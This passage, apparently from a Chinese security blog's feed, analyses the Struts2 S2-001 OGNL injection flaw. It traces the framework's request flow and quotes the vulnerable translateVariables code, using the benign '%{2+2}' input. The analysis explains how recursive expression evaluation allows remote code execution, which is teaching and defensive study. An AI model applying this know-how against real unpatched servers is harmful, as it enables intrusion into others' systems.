&#39;d&#39;:&#39;dd&#39;&#125;</code></li><li>访问数组/集合中的元素：<code>#Arrays[0]</code></li><li>访问 Map 中的元素：<code>#Map[&#39;key&#39;]</code></li><li>OGNL 针对集合提供了一些伪属性（如size，isEmpty），让我们可以通过属性的方式来调用方法。</li></ul><p>除了以上基础操作之外，OGNL 还支持投影、过滤：</p><ul><li>投影（把集合中所有对象的某个属性抽出来，单独构成一个新的集合对象）：<code>collection.&#123;expression&#125;</code></li><li>过滤（将满足条件的对象，构成一个新的集合返回）：<code>collection.&#123;?|^|$ expression&#125;</code></li></ul><p>其中上面 <code>?|^|$</code> 的含义如下：</p><ul><li><code>?</code>：获得所有符合逻辑的元素。</li><li><code>^</code>：获得符合逻辑的第一个元素。</li><li><code>$</code>：获得符合逻辑的最后一个元素。</li></ul><p>在使用过滤操作时，通常会使用 <code>#this</code>，这个表达式用于代表当前正在迭代的集合中的对象。</p><p>OGNL 还支持 Lambda 表达式：<code>:[ ... ]</code>，例如计算阶乘 <code>#f = :[#this==1?1:#this*#f(#this-1)] , #f(4)</code>。</p><p>还有使用数学运算符，使用“,”号连接表达式，in 与 not in 运算符，比较简单，不再赘述。</p><p>可以看到 OGNL表达式的功能非常强大,用户一旦可控后果不堪设想.</p><h1 id="0X02-Struts2"><a href="#0X02-Struts2" class="headerlink" title="0X02:Struts2"></a>0X02:Struts2</h1><p>百度Struts2审计已经有一大把教程使用Maven来搭建复现环境了,这里就不浪费篇章再复制粘贴一边,直接进入主题.</p><p>看到这篇文章的大家应该下面这张图大家应该已经不陌生了,他清楚的写出了Struts2的执行流程.</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109151832955.png" class title="image-20220109151832955"><p>让我们跟着这个图来看一下这个Struts2究竟是怎么执行的.</p><p>项目目录如下:</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109153039655.png" class title="image-20220109153039655"><h2 id="1-Filter-过滤器"><a href="#1-Filter-过滤器" class="headerlink" title="1.Filter(过滤器)"></a>1.Filter(过滤器)</h2><p>客户端发起一个http请求,这个请求经过我们的Tomcat容器处理后首先便要经过这个巨大的黄色方框,这也就是Struts2的起点,过滤器</p><p>这个核心过滤器的配置在我们的web.xml中,它规定了我们的请求走的是哪一个过滤器</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span></span><br><span class="line">      org.apache.struts2.dispatcher.FilterDispatcher</span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>从配置文件中不难看出我们经过的过滤器是来自org.apache.struts2.dispatcher.FilterDispatcher类,规则是所有的请求全部经过</p><p>(url-pattern为/*)</p><p>我们来到org.apache.struts2.dispatcher.FilterDispatcher:152</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109153722240.png" class title="image-20220109153722240"><p>首先便会获取request,response,servletContext</p><p>接着来到org.apache.struts2.dispatcher.FilterDispatcher:184</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.dispatcher.serviceAction(request, response, servletContext, mapping);</span><br></pre></td></tr></table></figure><h2 id="2-ActionProxy-动作代理"><a href="#2-ActionProxy-动作代理" class="headerlink" title="2.ActionProxy(动作代理)"></a>2.ActionProxy(动作代理)</h2><p>我们跟进serviceAction()来到org.apache.struts2.dispatcher.Dispatcher:332</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ActionProxy proxy = ((ActionProxyFactory)config.getContainer().getInstance(ActionProxyFactory.class)).createActionProxy(namespace, name, extraContext, <span class="keyword">true</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>在这个地方实例化ActionProxy,这个ActionProxy也就是为Struts2执行流程图中的第五步做准备</p><p>往下来到org.apache.struts2.dispatcher.Dispatcher:339,调用proxy的execute执行动作,也就是执行了Struts2流程中的ActionProxy到拦截器这一过程</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109165218191.png" class title="image-20220109165218191"><p>根据流程图我们也可以看到现在我们来到拦截器的部分了</p><h3 id="3-拦截器"><a href="#3-拦截器" class="headerlink" title="3.拦截器"></a>3.拦截器</h3><p>跟进proxy.execute()后直接调用invocation.invoke(),这里面通过反射机制调用了用户action中的excute(下图中的excute)</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109165540002.png" class title="image-20220109165540002"><h2 id="4-执行动作"><a href="#4-执行动作" class="headerlink" title="4.执行动作"></a>4.执行动作</h2><p>这里便是我们自己写的execute了,判断用户名和密码是否为空,如果为空则返回error</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109174040674.png" class title="image-20220109174040674"><h1 id="0X03-漏洞造成点"><a href="#0X03-漏洞造成点" class="headerlink" title="0X03:漏洞造成点"></a>0X03:漏洞造成点</h1><p>前面的一大堆只是大致了解了一下Struts2是如何工作的(这其中其实说的也不是特别详细,只是个大概,毕竟第一次接触,理解的十分不完善),网上大部分文章也没有提及,都是从下文doEndTag开始分析的,在开始分析之前我想各位应该都自己搭过环境并且复现过了,这里抛出了我的一个疑问</p><p><strong>疑问1:为什么只有在return “error”的时候会复现成功而return “success”的时候不会呢?</strong></p><p>这个疑问会在后面进行解答</p><p>我么们输入如下的字符串%{2+2}</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109183038955.png" class title="image-20220109183038955"><p>经过前面一大堆Struts2的处理后来到了doEndTag和doStartTag</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109175802212.png" class title="image-20220109175802212"><p>doStartTag是用来解析.jsp文件的函数,解析开始标签的时候会用到</p><p>doEndTag是用来解析.jsp文件的函数,解析结束标签的时候会用到</p><p>当执行到doEndTag时就代表已经解析完了对应jsp文件表单上的数据,即将传递给Struts2进行处理,那么我们就把断点下在ComponentTagSupport.class:25,看一下数据都被拿去干了啥</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109181944424.png" class title="image-20220109181944424"><p>跟进compoent.end()</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109183420459.png" class title="image-20220109183420459"><p>继续跟进evaluateParams()</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109183936560.png" class title="image-20220109183936560"><p>往下看到302行(UIBean.class),此处会判断altSynatax()是否开启,也就是否允许在标签中使用表达式语法,这里默认就是True,这是很重要的.如果没开启这个就无法造成rce</p><p>然后我们就会得到一个拼接好的字符串(表达式)%{username},等等OGNL就通过这个表达式来获取表单中username的值</p><p>继续往下看到306行,跟进findValue</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109184322019.png" class title="image-20220109184322019"><p>跟进TestPareUtil.translateVariables(),继续跟进translateVariables()</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109184435854.png" class title="image-20220109184435854"><p>来到translateVariables()这里也是主要的漏洞代码段,我们把它单独拿出来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">translateVariables</span><span class="params">(<span class="keyword">char</span> open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator)</span> </span>&#123;</span><br><span class="line">    Object result = expression;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> start = expression.indexOf(open + <span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> length = expression.length();</span><br><span class="line">        <span class="keyword">int</span> x = start + <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(start != -<span class="number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">char</span> c = expression.charAt(x++);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                ++count;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;&#125;&#x27;</span>) &#123;</span><br><span class="line">                --count;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> end = x - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (start == -<span class="number">1</span> || end == -<span class="number">1</span> || count != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String <span class="keyword">var</span> = expression.substring(start + <span class="number">2</span>, end);</span><br><span class="line">        Object o = stack.findValue(<span class="keyword">var</span>, asType);</span><br><span class="line">        <span class="keyword">if</span> (evaluator != <span class="keyword">null</span>) &#123;</span><br><span class="line">            o = evaluator.evaluate(o);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String left = expression.substring(<span class="number">0</span>, start);</span><br><span class="line">        String right = expression.substring(end + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (o != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (TextUtils.stringSet(left)) &#123;</span><br><span class="line">                result = left + o;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result = o;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (TextUtils.stringSet(right)) &#123;</span><br><span class="line">                result = result + right;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            expression = left + o + right;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result = left + right;</span><br><span class="line">            expression = left + right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到改代码段是对expression的一个处理,而此时expression的值是**%{username}**</p><p>我们分析一下这段代码干了啥</p><p>可以看到32行处result=%{username}等等OGNL表达式就会解析这个%{}中的值(解析这个username),从而拿到到表单中username的值</p><p>进入34第一个while(true)</p><p>35行-38行设置了一堆flag用来遍历%{username}</p><p>看到重点代码,第40行的while循环,在这个循环中如果遍历的字符串不是以%{开头的话,start会在35行被赋值为-1,如果遍历的字符串不是以}结尾或者字符串中没有成对的{}的话,count会为1</p><p>简单的概括一下,如果输入的字符串不是形如%{xxxx}的字符串,要么count为1,要么start为-1</p><p>有什么用呢?</p><p>在第50行,如果if的条件满足将进入第51行,也就是说如果输入的字符串不是形如%{xxx}的话就会进入51行,如果是的话就会往下进行.</p><p>我们这里执行第一次循环,输入的是%{username},经过一个循环后 start=0 count=0 end=10 不满足if条件,进入下面的继续执行</p><p>来到第55行,stack.findValue(var,asType)这个时候var=username也就是%{}中的值,将username当作表达式进行解析,而OGNL表达式解析跟对象的时候直接写名字就好了,所以跟进一下看看</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109192547701.png" class title="image-20220109192547701"><p>来到重点了,此时执行OgnlUtil.getValue(expr,this,context,this.root,asType)</p><p>前面说了,ognl的getvalue方法是可以执行代码的,只要expr为我们所控就可以,这里执行第一次解析,得到value的值为%{2+2}(因为表单中username的值是%{2+2}这里解析出来了),到现在,我们的payload出现了.</p><p>我i们往下看一下</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109193719677.png" class title="image-20220109193719677"><p>执行完后返回,现在Object o的值为%{2+2},值的注意的是我们现在还是在translateVariables这个方法中的第一个死循环里面的,往下执行发现result已经被重新赋值了,变为了o</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109194435064.png" class title="image-20220109194435064"><p>继续往下执行便重新这一个过程了,此时的result为我们的%{2+2},我们的%{2+2}又会被当做ognl表达式进行解析,将字符串”2+2”传递到OgnlUtil.getValue(expr,this,context,this.root,asType)中进行计算</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109194830732.png" class title="image-20220109194830732">当执行到第三次循环时,此时o已经为4(注意32行),已经无法满足需求了,start已经为-1,会直接进入第51行,结束循环<img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109194953004.png" class title="image-20220109194953004"><p>至此,整个过程已经清晰明了了,整个漏洞的核心就在于在translateVariables中反复对表达式进行解析,本来解析一层%{username}就可以了,但是开发者将username反复解析直到没有形如%{}的式子位置,那么就造成了注入,用户可控ognl的getvalue方法,从而导致执行任意命令</p><h1 id="0X04-解决刚刚发生的问题"><a href="#0X04-解决刚刚发生的问题" class="headerlink" title="0X04:解决刚刚发生的问题"></a>0X04:解决刚刚发生的问题</h1><p><strong>疑问1:为什么只有在return “error”的时候会复现成功而return “success”的时候不会呢?</strong></p><p>我么通过分析可以发现,整个漏洞的起点是由于调用了doEndTag和doStartTag,从而解析jsp中的表达式标签.</p><p>我们发出的请求-&gt;Struts2处理-&gt;处理完毕后将结果返回jsp,在这个过程中如果返回的jsp文件存在标签,而这个标签恰巧是能够被解析的</p><p>举个例子,index.jsp中存在标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:form action&#x3D;&quot;login&quot;&gt;</span><br><span class="line">    &lt;s:textfield name&#x3D;&quot;username&quot; label&#x3D;&quot;username&quot; &#x2F;&gt;</span><br><span class="line">    &lt;s:textfield name&#x3D;&quot;password&quot; label&#x3D;&quot;password&quot; &#x2F;&gt;</span><br><span class="line">    &lt;s:submit&gt;&lt;&#x2F;s:submit&gt;</span><br><span class="line">&lt;&#x2F;s:form&gt;</span><br></pre></td></tr></table></figure><p>而success.jsp中什么都没有,只有一个h1标签</p><p>我们的逻辑是如果返回error 那么就停留在index.jsp</p><p>如果是success,那么久进入success.jsp</p><p>这个停留在index.jsp的过程,就是触发漏洞的过程</p><p>我们发起请求-&gt;Struts2处理-&gt;发现输入不符合后端判断要求,返回error-&gt;通过查询struct.xml发现返回的error需要回到index.jsp-&gt;既然页面要回到index.jsp就需要重新渲染-&gt;<strong>发现index.jsp中存在标签</strong>-&gt;调用doEndTag,doStartTag方法去解析标签-&gt;刚好此时需要获取有一个名为username的表单,我们要呈现给用户(新的index.jsp),就要先去找他有没有对应的值,而这个值是可以通过ognl获取到的(ognl.getvalue)-&gt;通过ognl.getvalue获取到了值,如果是普通用户名就显示普通用户名,如果是恶意表达式就进行计算后将结果返回到username(这也是为什么执行算术运算会在username处得到回显的原因,如果执行java代码,那么返回的o会是一个null所以没有回显)-&gt;返回新的index.jsp</p><p>而网上大多数demo的success.jsp中并没有任何标签,只是一个提示信息(例如一个h标签),根本不会触发标签渲染,所以在”<strong>发现index.jsp中存在标签</strong>“这一步就直接断掉了,根本不会执行到doStartTag,doEndTag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言:&quot;&gt;&lt;/a&gt;前言:&lt;/h1&gt;&lt;p&gt;本篇文章是站在一个只会一丁点java基础,没有任何Java开发经验的的菜鸡眼中去完成的.所设计知识点繁多,杂乱,从Struts2的执行流</summary>
      
    
    
    
    
    <category term="Java代码审计" scheme="https://men9da.cn/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Struts2" scheme="https://men9da.cn/tags/Struts2/"/>
    
    <category term="JAVA安全" scheme="https://men9da.cn/tags/JAVA%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
